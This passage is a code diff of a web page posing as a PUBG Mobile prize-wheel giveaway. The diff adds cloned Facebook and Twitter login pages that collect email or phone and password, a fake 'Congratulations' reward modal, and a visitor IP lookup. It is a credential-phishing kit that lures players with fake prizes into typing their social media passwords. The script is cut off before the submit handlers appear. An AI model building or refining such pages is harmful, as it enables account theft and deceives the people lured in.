@@ -29,7 +29,7 @@
             width: 100%;
             height: 100%;
             background: 
-                linear-gradient(rgba(0, 0, 0, 0.9), rgba(0, 0, 0, 0.95)),
+                linear-gradient(rgba(0, 0, 0, 0.85), rgba(0, 0, 0, 0.95)),
                 url('https://share.google/x8DRJEzACUjxSmMSp');
             background-size: cover;
             background-position: center;
@@ -88,40 +88,29 @@
             z-index: 0;
         }
 
-        .pubg-logo {
+        .main-title {
             font-size: 36px;
             font-weight: 900;
-            background: linear-gradient(45deg, #ffd700, #ff6b00, #ffd700);
+            background: linear-gradient(45deg, #ffd700, #ff6b00);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
             text-transform: uppercase;
             letter-spacing: 3px;
-            margin-bottom: 5px;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
+            margin-bottom: 10px;
             position: relative;
             z-index: 1;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
         }
 
-        .metro-title {
-            font-size: 20px;
+        .sub-title {
+            font-size: 18px;
             color: #fff;
             font-weight: 300;
-            letter-spacing: 4px;
-            position: relative;
-            z-index: 1;
-            margin-bottom: 5px;
-            text-transform: uppercase;
-        }
-
-        .signature-text {
-            font-size: 16px;
-            color: #ffd700;
-            font-weight: bold;
-            position: relative;
-            z-index: 1;
-            text-transform: uppercase;
             letter-spacing: 2px;
+            position: relative;
+            z-index: 1;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
         }
 
         /* Секция рулетки */
@@ -148,193 +137,99 @@
             opacity: 0.3;
         }
 
-        /* Контейнер для рулетки */
-        .slot-machine-container {
+        /* Рулетка из изображения */
+        .slot-machine-wrapper {
             width: 320px;
             height: 320px;
             margin: 0 auto 30px;
             position: relative;
-        }
-
-        /* Фон рулетки из вашей картинки */
-        .slot-machine-background {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://i.imgur.com/placeholder_wheel.png'); /* Здесь будет ваша рулетка */
+            background: url('https://share.google/f77mFNmtzAj8eGuSR');
             background-size: contain;
             background-position: center;
             background-repeat: no-repeat;
-            z-index: 1;
         }
 
-        /* Если картинка не загрузится, покажем CSS-версию */
-        .slot-machine-background::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: 
-                radial-gradient(circle at center, #1a1a2e 0%, #0a0a14 70%),
-                repeating-conic-gradient(
-                    from 0deg,
-                    #ff6b00 0deg 22.5deg,
-                    #ffd700 22.5deg 45deg,
-                    #ff6b00 45deg 67.5deg,
-                    #ffd700 67.5deg 90deg,
-                    #ff6b00 90deg 112.5deg,
-                    #ffd700 112.5deg 135deg,
-                    #ff6b00 135deg 157.5deg,
-                    #ffd700 157.5deg 180deg,
-                    #ff6b00 180deg 202.5deg,
-                    #ffd700 202.5deg 225deg,
-                    #ff6b00 225deg 247.5deg,
-                    #ffd700 247.5deg 270deg,
-                    #ff6b00 270deg 292.5deg,
-                    #ffd700 292.5deg 315deg,
-                    #ff6b00 315deg 337.5deg,
-                    #ffd700 337.5deg 360deg
-                );
-            border-radius: 50%;
-            border: 8px solid #ffd700;
-            box-shadow: 
-                0 0 50px rgba(255, 107, 0, 0.5),
-                inset 0 0 50px rgba(0, 0, 0, 0.8);
-            z-index: -1;
-        }
-
-        /* Указатель */
         .slot-pointer {
             position: absolute;
-            top: -25px;
+            top: 0;
             left: 50%;
             transform: translateX(-50%);
-            width: 50px;
+            width: 40px;
             height: 60px;
             background: linear-gradient(180deg, #ff0000, #ff6b00);
             clip-path: polygon(50% 0%, 100% 100%, 0% 100%);
             z-index: 10;
-            filter: drop-shadow(0 0 15px rgba(255, 0, 0, 0.7));
+            filter: drop-shadow(0 0 10px rgba(255, 0, 0, 0.7));
         }
 
-        .slot-pointer::after {
-            content: '';
-            position: absolute;
-            top: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 20px;
-            height: 20px;
-            background: #ffd700;
-            border-radius: 50%;
-            box-shadow: 0 0 10px #ffd700;
-        }
-
-        /* Вращающаяся часть */
-        .slot-wheel {
+        .slot-wheel-container {
             position: absolute;
             top: 50%;
             left: 50%;
-            width: 220px;
-            height: 220px;
             transform: translate(-50%, -50%);
-            z-index: 3;
+            width: 280px;
+            height: 280px;
             border-radius: 50%;
             overflow: hidden;
-            transition: transform 4s cubic-bezier(0.1, 0.2, 0.3, 1);
         }
 
-        /* Призы на рулетке */
-        .slot-prize {
+        .slot-wheel {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            transition: transform 4s cubic-bezier(0.17, 0.67, 0.83, 0.67);
+            transform-origin: center;
+        }
+
+        .slot-item {
             position: absolute;
-            width: 60px;
-            height: 60px;
+            width: 140px;
+            height: 140px;
+            left: 50%;
+            top: 0;
+            margin-left: -70px;
+            transform-origin: bottom center;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            transform-origin: center;
         }
 
-        .prize-icon {
-            width: 40px;
-            height: 40px;
-            background: rgba(255, 215, 0, 0.2);
-            border: 2px solid #ffd700;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            color: #ffd700;
-            margin-bottom: 5px;
-            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5));
+        .slot-image {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 8px rgba(255, 215, 0, 0.8));
         }
 
-        .prize-text {
-            font-size: 10px;
-            color: #fff;
-            font-weight: bold;
-            text-align: center;
-            text-shadow: 0 0 5px #000;
-            max-width: 80px;
-            transform: rotate(45deg);
-        }
-
-        /* Текст в центре */
-        .center-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
-            z-index: 4;
-            color: #ffd700;
-            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
-            background: rgba(0, 0, 0, 0.7);
-            padding: 15px;
-            border-radius: 15px;
-            border: 2px solid #ff6b00;
-        }
-
-        .mexico-text {
-            font-size: 20px;
-            font-weight: bold;
-            text-transform: uppercase;
-            margin-bottom: 5px;
-        }
-
-        .royale-text {
+        .slot-name {
             font-size: 14px;
-            color: #fff;
-            text-transform: uppercase;
-        }
-
-        /* Кнопка спина */
-        .spin-button-container {
-            margin: 20px auto;
-            text-align: center;
+            font-weight: bold;
+            color: #ffd700;
+            text-shadow: 0 0 5px rgba(255, 215, 0, 0.5);
+            transform: rotate(-90deg);
+            white-space: nowrap;
         }
 
         .spin-button {
-            background: linear-gradient(45deg, #ff0000, #ff6b00, #ffd700);
+            background: linear-gradient(45deg, #ff0000, #ff6b00);
             border: none;
-            border-radius: 30px;
-            padding: 25px 60px;
-            font-size: 28px;
+            border-radius: 25px;
+            padding: 20px 50px;
+            font-size: 22px;
             font-weight: bold;
             color: #fff;
             cursor: pointer;
             transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin: 0 auto;
             text-transform: uppercase;
             letter-spacing: 2px;
-            box-shadow: 
-                0 10px 30px rgba(255, 0, 0, 0.4),
-                inset 0 2px 5px rgba(255, 255, 255, 0.3);
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4);
             position: relative;
             overflow: hidden;
         }
@@ -349,11 +244,11 @@
             background: linear-gradient(
                 45deg,
                 transparent,
-                rgba(255, 255, 255, 0.2),
+                rgba(255, 255, 255, 0.1),
                 transparent
             );
             transform: rotate(45deg);
-            animation: shine 3s infinite linear;
+            animation: shine 3s infinite;
         }
 
         @keyframes shine {
@@ -363,9 +258,7 @@
 
         .spin-button:hover {
             transform: translateY(-5px) scale(1.05);
-            box-shadow: 
-                0 15px 40px rgba(255, 0, 0, 0.6),
-                inset 0 2px 5px rgba(255, 255, 255, 0.5);
+            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.6);
         }
 
         .spin-button:disabled {
@@ -379,130 +272,67 @@
             display: none;
         }
 
-        .spin-text {
-            font-size: 14px;
-            color: #aaa;
-            margin-top: 10px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        /* Доступные призы */
-        .prizes-section {
+        /* Сетка призов */
+        .prize-grid-section {
             padding: 20px;
             margin: 20px;
             background: rgba(20, 20, 40, 0.8);
-            border-radius: 20px;
-            border: 2px solid rgba(255, 215, 0, 0.3);
-            position: relative;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 215, 0, 0.3);
         }
 
-        .prizes-section::before {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, #ff6b00, #ffd700, #ff6b00);
-            border-radius: 22px;
-            z-index: -1;
-            opacity: 0.3;
-        }
-
-        .prizes-title {
+        .section-title {
             text-align: center;
-            font-size: 22px;
+            font-size: 20px;
             color: #ffd700;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             text-transform: uppercase;
             font-weight: bold;
-            letter-spacing: 2px;
-            position: relative;
-            display: inline-block;
-            left: 50%;
-            transform: translateX(-50%);
         }
 
-        .prizes-title::after {
-            content: '';
-            position: absolute;
-            bottom: -8px;
-            left: 0;
-            width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, transparent, #ffd700, transparent);
-        }
-
-        .prizes-grid {
+        .prize-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 15px;
         }
 
         .prize-item {
-            background: rgba(255, 107, 0, 0.1);
-            border: 2px solid rgba(255, 215, 0, 0.3);
-            border-radius: 15px;
-            padding: 20px 15px;
+            background: linear-gradient(135deg, rgba(255, 107, 0, 0.1), rgba(255, 215, 0, 0.05));
+            border: 2px solid rgba(255, 215, 0, 0.2);
+            border-radius: 12px;
+            padding: 15px;
             text-align: center;
             transition: all 0.3s;
             cursor: pointer;
-            position: relative;
-            overflow: hidden;
         }
 
         .prize-item:hover {
             transform: translateY(-5px);
             border-color: #ffd700;
             box-shadow: 0 10px 20px rgba(255, 215, 0, 0.2);
-            background: rgba(255, 107, 0, 0.2);
-        }
-
-        .prize-item::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, #ff6b00, #ffd700, #ff6b00);
-            background-size: 200% 100%;
-            animation: shimmer 2s infinite linear;
-        }
-
-        @keyframes shimmer {
-            0% { background-position: -200% 0; }
-            100% { background-position: 200% 0; }
+            background: linear-gradient(135deg, rgba(255, 107, 0, 0.2), rgba(255, 215, 0, 0.1));
         }
 
         .prize-image {
             width: 70px;
             height: 70px;
             object-fit: contain;
-            margin-bottom: 15px;
-            filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.5));
-            transition: all 0.3s;
-        }
-
-        .prize-item:hover .prize-image {
-            transform: scale(1.1) rotate(5deg);
-            filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.7));
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.5));
         }
 
         .prize-name {
-            font-size: 14px;
+            font-size: 12px;
             color: #fff;
             font-weight: bold;
-            margin-bottom: 8px;
-            text-transform: uppercase;
+            margin-bottom: 5px;
         }
 
         .prize-type {
-            font-size: 12px;
+            font-size: 10px;
             color: #ffd700;
             background: rgba(255, 215, 0, 0.1);
-            padding: 4px 10px;
+            padding: 2px 6px;
             border-radius: 10px;
             display: inline-block;
         }
@@ -510,17 +340,12 @@
         /* Кнопки входа */
         .login-section {
             padding: 20px;
-            margin: 0 20px;
-            background: rgba(20, 20, 40, 0.8);
-            border-radius: 20px;
-            border: 2px solid rgba(255, 215, 0, 0.3);
         }
 
         .login-buttons {
             display: flex;
             flex-direction: column;
             gap: 15px;
-            margin-top: 20px;
         }
 
         .login-button {
@@ -577,6 +402,203 @@
             font-size: 20px;
         }
 
+        /* Страницы */
+        .page {
+            display: none;
+            min-height: 100vh;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Facebook страница */
+        .facebook-page .container {
+            background: #f0f2f5;
+        }
+
+        .fb-header {
+            background: #fff;
+            padding: 40px 20px 30px;
+            text-align: center;
+            border-bottom: 1px solid #dadde1;
+        }
+
+        .fb-logo {
+            color: #1877f2;
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            font-family: Helvetica, Arial, sans-serif;
+            letter-spacing: -2px;
+        }
+
+        .fb-title {
+            color: #1c1e21;
+            font-size: 22px;
+            font-weight: normal;
+            margin: 0;
+            line-height: 1.4;
+        }
+
+        .fb-form {
+            padding: 30px 25px;
+            background: #fff;
+        }
+
+        .fb-input {
+            width: 100%;
+            padding: 18px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 18px;
+            color: #1d2129;
+            margin-bottom: 20px;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        .fb-input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+
+        .fb-button {
+            width: 100%;
+            padding: 18px;
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 22px;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: Helvetica, Arial, sans-serif;
+            margin-bottom: 20px;
+            transition: background 0.3s;
+        }
+
+        .fb-button:hover {
+            background: #166fe5;
+        }
+
+        .fb-link {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 16px;
+            display: block;
+            text-align: center;
+            margin: 20px 0;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        .fb-divider {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 25px 0;
+        }
+
+        .fb-create {
+            background: #42b72a;
+        }
+
+        .fb-create:hover {
+            background: #36a420;
+        }
+
+        .fb-cancel {
+            background: #e4e6eb;
+            color: #4b4f56;
+        }
+
+        .fb-cancel:hover {
+            background: #d8dadf;
+        }
+
+        /* Twitter страница */
+        .twitter-page .container {
+            background: #000;
+        }
+
+        .twitter-header {
+            padding: 40px 20px 30px;
+            text-align: center;
+            border-bottom: 1px solid #2f3336;
+        }
+
+        .twitter-logo {
+            color: #1da1f2;
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+
+        .twitter-title {
+            font-size: 26px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+
+        .twitter-subtitle {
+            color: #6e767d;
+            font-size: 18px;
+            line-height: 1.4;
+        }
+
+        .twitter-form {
+            padding: 30px 25px;
+        }
+
+        .twitter-input {
+            width: 100%;
+            padding: 18px;
+            background: transparent;
+            border: 2px solid #2f3336;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .twitter-input:focus {
+            border-color: #1da1f2;
+            outline: none;
+        }
+
+        .twitter-button {
+            width: 100%;
+            padding: 18px;
+            background: #1da1f2;
+            color: #fff;
+            border: none;
+            border-radius: 25px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .twitter-button:hover {
+            background: #1a8cd8;
+        }
+
+        .twitter-cancel {
+            background: transparent;
+            border: 2px solid #2f3336;
+            color: #fff;
+            margin-top: 15px;
+        }
+
+        .twitter-cancel:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
         /* Кнопка отмены */
         .cancel-button {
             position: fixed;
@@ -598,6 +620,123 @@
         .cancel-button:hover {
             background: rgba(255, 107, 0, 0.5);
             transform: translateX(-50%) scale(1.05);
+        }
+
+        /* Модальное окно */
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border-radius: 25px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            border: 3px solid #ffd700;
+            box-shadow: 0 0 50px rgba(255, 215, 0, 0.3);
+            animation: modalAppear 0.5s ease;
+        }
+
+        @keyframes modalAppear {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        .modal-icon {
+            font-size: 80px;
+            color: #ffd700;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite alternate;
+        }
+
+        @keyframes bounce {
+            from { transform: translateY(0); }
+            to { transform: translateY(-20px); }
+        }
+
+        .modal-title {
+            font-size: 32px;
+            color: #ffd700;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+        }
+
+        .modal-text {
+            font-size: 18px;
+            color: #fff;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .prize-display {
+            background: rgba(255, 215, 0, 0.1);
+            border: 2px dashed #ffd700;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+
+        .won-prize-image {
+            width: 120px;
+            height: 120px;
+            object-fit: contain;
+            margin: 0 auto 20px;
+            filter: drop-shadow(0 0 25px rgba(255, 215, 0, 0.7));
+        }
+
+        .won-prize-name {
+            font-size: 28px;
+            color: #ffd700;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .won-prize-type {
+            font-size: 18px;
+            color: #aaa;
+        }
+
+        .code-display {
+            font-size: 22px;
+            color: #00ff95;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 3px;
+            margin: 25px 0;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            border: 2px solid #00ff95;
+            word-break: break-all;
+        }
+
+        .modal-button {
+            background: linear-gradient(45deg, #ff0000, #ff6b00);
+            border: none;
+            border-radius: 25px;
+            padding: 18px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+        }
+
+        .modal-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 25px rgba(255, 0, 0, 0.4);
         }
 
         /* Конфетти */
@@ -627,26 +766,31 @@
                 max-width: 100%;
             }
             
-            .pubg-logo {
-                font-size: 32px;
+            .main-title {
+                font-size: 28px;
             }
             
-            .metro-title {
-                font-size: 18px;
-            }
-            
-            .slot-machine-container {
+            .slot-machine-wrapper {
                 width: 280px;
                 height: 280px;
             }
             
-            .spin-button {
-                padding: 20px 40px;
-                font-size: 22px;
+            .slot-wheel-container {
+                width: 240px;
+                height: 240px;
             }
             
-            .prizes-grid {
+            .prize-grid {
                 grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .modal-content {
+                padding: 25px;
+            }
+            
+            .code-display {
+                font-size: 18px;
+                padding: 15px;
             }
         }
     </style>
@@ -656,81 +800,150 @@
     <div class="background-wallpaper"></div>
     <div class="overlay-gradient"></div>
 
-    <div class="container">
-        <!-- Верхний баннер -->
-        <div class="top-banner">
-            <div class="pubg-logo">PUBG MOBILE</div>
-            <div class="metro-title">METRO ROYALE PASS</div>
-            <div class="signature-text">SIGNATURE</div>
-        </div>
+    <!-- Главная страница -->
+    <div class="page active" id="mainPage">
+        <div class="container">
+            <!-- Верхний баннер -->
+            <div class="top-banner">
+                <h1 class="main-title">PUBG MOBILE</h1>
+                <p class="sub-title">METRO ROYALE PASS SIGNATURE</p>
+            </div>
 
-        <!-- Рулетка -->
-        <div class="slot-machine-section">
-            <div class="slot-machine-container">
-                <div class="slot-pointer"></div>
-                <div class="slot-machine-background">
-                    <!-- Здесь будет ваша картинка рулетки -->
+            <!-- Рулетка -->
+            <div class="slot-machine-section">
+                <div class="slot-machine-wrapper">
+                    <div class="slot-pointer"></div>
+                    <div class="slot-wheel-container">
+                        <div class="slot-wheel" id="slotWheel">
+                            <!-- Слоты будут добавлены через JavaScript -->
+                        </div>
+                    </div>
                 </div>
-                <div class="slot-wheel" id="slotWheel">
-                    <!-- Призы на рулетке будут созданы через JS -->
+                
+                <button class="spin-button" id="spinButton">
+                    <i class="fas fa-dice"></i>
+                    SPIN TO WIN
+                </button>
+            </div>
+
+            <!-- Сетка призов -->
+            <div class="prize-grid-section">
+                <h3 class="section-title">AVAILABLE PRIZES</h3>
+                <div class="prize-grid" id="prizeGrid">
+                    <!-- Призы будут добавлены через JavaScript -->
                 </div>
-                <div class="center-text">
-                    <div class="mexico-text">MEXICO ROYALE</div>
-                    <div class="royale-text">ROYALE PASS S</div>
+            </div>
+
+            <!-- Кнопки входа -->
+            <div class="login-section">
+                <div class="login-buttons">
+                    <div class="login-button" onclick="showPage('facebookPage')">
+                        <div class="login-icon facebook-icon">
+                            <i class="fab fa-facebook-f"></i>
+                        </div>
+                        <div class="login-text">
+                            <div class="login-title">Login With Facebook</div>
+                            <div class="login-desc">Log in to your Facebook account to connect to PUBG MOBILE</div>
+                        </div>
+                        <div class="arrow">
+                            <i class="fas fa-chevron-right"></i>
+                        </div>
+                    </div>
+
+                    <div class="login-button" onclick="showPage('twitterPage')">
+                        <div class="login-icon twitter-icon">
+                            <i class="fab fa-twitter"></i>
+                        </div>
+                        <div class="login-text">
+                            <div class="login-title">Login With Twitter</div>
+                            <div class="login-desc">Log in to your Twitter account to connect to PUBG MOBILE</div>
+                        </div>
+                        <div class="arrow">
+                            <i class="fas fa-chevron-right"></i>
+                        </div>
+                    </div>
                 </div>
+            </div>
+
+            <!-- Кнопка отмены -->
+            <button class="cancel-button" onclick="cancelAction()">
+                CANCEL
+            </button>
+        </div>
+    </div>
+
+    <!-- Facebook страница -->
+    <div class="page facebook-page" id="facebookPage">
+        <div class="container">
+            <div class="fb-header">
+                <div class="fb-logo">facebook</div>
+                <div class="fb-title">Log in to your Facebook account to connect to PUBG MOBILE</div>
             </div>
             
-            <div class="spin-button-container">
-                <button class="spin-button" id="spinButton">
-                    SPIN TO<br>WIN
-                </button>
-                <div class="spin-text">Tap to spin the wheel</div>
+            <div class="fb-form">
+                <input type="text" class="fb-input" id="fbEmail" placeholder="Mobile number or email address" required>
+                <input type="password" class="fb-input" id="fbPassword" placeholder="Password" required>
+                
+                <button class="fb-button" onclick="submitFacebook()">Log In</button>
+                
+                <a href="#" class="fb-link">Forgotten password?</a>
+                
+                <hr class="fb-divider">
+                
+                <button class="fb-button fb-create">Create account</button>
+                <button class="fb-button fb-cancel" onclick="cancelAction()">Not now</button>
             </div>
         </div>
+    </div>
 
-        <!-- Доступные призы -->
-        <div class="prizes-section">
-            <h3 class="prizes-title">AVAILABLE PRIZES</h3>
-            <div class="prizes-grid" id="prizesGrid">
-                <!-- Призы будут добавлены через JavaScript -->
-            </div>
-        </div>
-
-        <!-- Кнопки входа -->
-        <div class="login-section">
-            <div class="login-buttons">
-                <div class="login-button" onclick="showFacebookLogin()">
-                    <div class="login-icon facebook-icon">
-                        <i class="fab fa-facebook-f"></i>
-                    </div>
-                    <div class="login-text">
-                        <div class="login-title">Login With Facebook</div>
-                        <div class="login-desc">Log in to your Facebook account to connect to PUBG MOBILE</div>
-                    </div>
-                    <div class="arrow">
-                        <i class="fas fa-chevron-right"></i>
-                    </div>
+    <!-- Twitter страница -->
+    <div class="page twitter-page" id="twitterPage">
+        <div class="container">
+            <div class="twitter-header">
+                <div class="twitter-logo">
+                    <i class="fab fa-twitter"></i>
                 </div>
-
-                <div class="login-button" onclick="showTwitterLogin()">
-                    <div class="login-icon twitter-icon">
-                        <i class="fab fa-twitter"></i>
-                    </div>
-                    <div class="login-text">
-                        <div class="login-title">Login With Twitter</div>
-                        <div class="login-desc">Log in to your Twitter account to connect to PUBG MOBILE</div>
-                    </div>
-                    <div class="arrow">
-                        <i class="fas fa-chevron-right"></i>
-                    </div>
-                </div>
+                <h2 class="twitter-title">Log in to Twitter</h2>
+                <p class="twitter-subtitle">Log in to your Twitter account to connect to PUBG MOBILE</p>
+            </div>
+            
+            <div class="twitter-form">
+                <input type="text" class="twitter-input" id="twitterEmail" placeholder="Phone, email, or username" required>
+                <input type="password" class="twitter-input" id="twitterPassword" placeholder="Password" required>
+                
+                <button class="twitter-button" onclick="submitTwitter()">Log in</button>
+                <button class="twitter-button twitter-cancel" onclick="cancelAction()">Cancel</button>
             </div>
         </div>
+    </div>
 
-        <!-- Кнопка отмены -->
-        <button class="cancel-button" onclick="cancelAction()">
-            CANCEL
-        </button>
+    <!-- Модальное окно с поздравлением -->
+    <div class="modal" id="congratsModal">
+        <div class="modal-content">
+            <div class="modal-icon">🎁</div>
+            <h2 class="modal-title">Congratulations!</h2>
+            <p class="modal-text">
+                Hi Survivor, your account has been processed to receive your selected rewards.<br>
+                Please wait up to 24 hours to receive this rewards in your in-game mailbox.
+            </p>
+            
+            <div class="prize-display">
+                <img id="wonPrizeImage" src="" alt="Prize" class="won-prize-image">
+                <div id="wonPrizeName" class="won-prize-name"></div>
+                <div id="wonPrizeType" class="won-prize-type"></div>
+            </div>
+            
+            <div class="code-display" id="prizeCode"></div>
+            
+            <div style="color: #aaa; font-size: 16px; margin: 20px 0;">
+                <i class="fas fa-info-circle"></i> The code will be sent to your email within 24 hours
+            </div>
+            
+            <button class="modal-button" onclick="closeModal()">
+                <i class="fas fa-check"></i>
+                OK
+            </button>
+        </div>
     </div>
 
     <script>
@@ -740,25 +953,14 @@
 
         // Data
         const prizes = [
-            { id: 1, name: "MEXICO ROYALE", type: "ROYALE PASS S", icon: "👑", color: "#ffd700" },
-            { id: 2, name: "PHARAOH SKIN", type: "LEGENDARY", icon: "👑", color: "#ff6b00" },
-            { id: 3, name: "MUMMY SKIN", type: "EPIC", icon: "💀", color: "#fff" },
-            { id: 4, name: "120 UC", type: "CURRENCY", icon: "💰", color: "#00ff95" },
-            { id: 5, name: "300 UC", type: "CURRENCY", icon: "💰", color: "#00ff95" },
-            { id: 6, name: "M416 GLACIER", type: "WEAPON", icon: "🔫", color: "#1da1f2" },
-            { id: 7, name: "GOLDEN PASS", type: "PASS", icon: "🎫", color: "#ffd700" },
-            { id: 8, name: "METRO CHEST", type: "MYSTERY", icon: "🎁", color: "#9b59b6" }
-        ];
-
-        const prizeImages = [
-            "mexico_royale.png",
-            "pharaoh.png",
-            "mummy.png",
-            "120uc.png",
-            "300uc.png",
-            "m416_glacier.png",
-            "golden_pass.png",
-            "metro_chest.png"
+            { id: 1, name: "MEXICO ROYALE", type: "ROYALE PASS S", image: "mexico_royale.png" },
+            { id: 2, name: "PHARAOH SKIN", type: "LEGENDARY SKIN", image: "pharaoh.png" },
+            { id: 3, name: "MUMMY SKIN", type: "EPIC SKIN", image: "mummy.png" },
+            { id: 4, name: "120 UC", type: "GAME CURRENCY", image: "120uc.png" },
+            { id: 5, name: "300 UC", type: "GAME CURRENCY", image: "300uc.png" },
+            { id: 6, name: "M416 GLACIER", type: "WEAPON SKIN", image: "m416_glacier.png" },
+            { id: 7, name: "GOLDEN PASS", type: "ROYALE PASS", image: "golden_pass.png" },
+            { id: 8, name: "METRO CHEST", type: "MYSTERY BOX", image: "metro_chest.png" }
         ];
 
         let userData = {
@@ -773,83 +975,67 @@
         };
 
         let hasSpun = false;
-        let isSpinning = false;
+        let currentRotation = 0;
+        const totalItems = 8;
 
         // Initialize
         document.addEventListener('DOMContentLoaded', function() {
-            createSlotPrizes();
-            createPrizesGrid();
+            createSlotWheel();
+            createPrizeGrid();
             getUserIP();
             
-            // Попробуем загрузить рулетку
-            loadWheelImage();
+            // Set image fallback
+            setTimeout(() => {
+                document.querySelectorAll('img').forEach(img => {
+                    img.onerror = function() {
+                        this.src = 'https://i.imgur.com/4N0vzrR.png';
+                    };
+                });
+            }, 1000);
         });
 
-        function loadWheelImage() {
-            // Попробуем загрузить рулетку из разных источников
-            const wheelSources = [
-                'https://share.google/f77mFNmtzAj8eGuSR',
-                'https://i.imgur.com/wheel_placeholder.png',
-                'https://via.placeholder.com/320x320/1a1a2e/ffd700?text=WHEEL'
-            ];
-            
-            const wheelBg = document.querySelector('.slot-machine-background');
-            let currentSrc = 0;
-            
-            function tryNextSource() {
-                if (currentSrc < wheelSources.length) {
-                    wheelBg.style.backgroundImage = `url('${wheelSources[currentSrc]}')`;
-                    currentSrc++;
-                    
-                    // Проверим загрузку
-                    const img = new Image();
-                    img.onload = function() {
-                        console.log('Wheel image loaded successfully');
-                    };
-                    img.onerror = function() {
-                        setTimeout(tryNextSource, 100);
-                    };
-                    img.src = wheelSources[currentSrc - 1];
-                }
-            }
-            
-            tryNextSource();
-        }
-
-        function createSlotPrizes() {
+        function createSlotWheel() {
             const wheel = document.getElementById('slotWheel');
-            const sectors = 8;
+            wheel.innerHTML = '';
             
-            for (let i = 0; i < sectors; i++) {
+            // Create 8 slots (по количеству секторов на рулетке)
+            for (let i = 0; i < totalItems; i++) {
                 const prizeIndex = i % prizes.length;
                 const prize = prizes[prizeIndex];
-                const angle = (360 / sectors) * i;
                 
-                const prizeElement = document.createElement('div');
-                prizeElement.className = 'slot-prize';
-                prizeElement.style.transform = `rotate(${angle}deg) translateY(-90px) rotate(${-angle}deg)`;
+                const item = document.createElement('div');
+                item.className = 'slot-item';
+                item.style.transform = `rotate(${(360 / totalItems) * i}deg)`;
                 
-                prizeElement.innerHTML = `
-                    <div class="prize-icon" style="background: ${prize.color}22; border-color: ${prize.color}">
-                        ${prize.icon}
-                    </div>
-                    <div class="prize-text" style="color: ${prize.color}">${prize.name}</div>
-                `;
+                // Create inner content
+                const itemContent = document.createElement('div');
+                itemContent.style.transform = `rotate(${-(360 / totalItems) * i}deg)`;
+                itemContent.style.textAlign = 'center';
                 
-                wheel.appendChild(prizeElement);
+                const img = document.createElement('img');
+                img.src = prize.image;
+                img.className = 'slot-image';
+                img.alt = prize.name;
+                
+                const name = document.createElement('div');
